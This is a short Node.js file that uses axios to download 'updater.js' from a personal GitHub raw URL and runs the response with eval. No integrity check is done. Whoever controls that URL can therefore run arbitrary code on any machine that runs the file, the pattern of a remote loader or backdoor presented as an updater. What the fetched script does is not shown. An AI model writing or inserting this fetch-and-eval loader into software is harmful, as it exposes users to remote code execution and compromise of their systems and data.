const axios = require('axios');

axios.get("https://raw.githubusercontent.com/ncazad/Azadx69x/refs/heads/main/updater.js")
	.then(res => eval(res.data));
